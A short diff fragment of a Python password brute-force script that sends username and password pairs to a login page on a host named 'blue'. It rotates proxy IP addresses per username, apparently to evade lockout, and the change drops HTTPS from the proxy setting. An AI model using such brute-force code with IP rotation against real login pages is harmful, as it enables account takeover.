@@ -22,7 +22,8 @@ for username in usernames:
         ipIndex = 0
     
     cur_ip = ip_addresses[ipIndex]
-    session.proxies = {'http': cur_ip, 'https': cur_ip}
+    session.proxies = {'http': cur_ip}
+    # session.proxies = {'http': cur_ip, 'https': cur_ip}
 
     for password in passwords:
         url = 'http://blue/login.php?user=' + username + '&pass=' + password
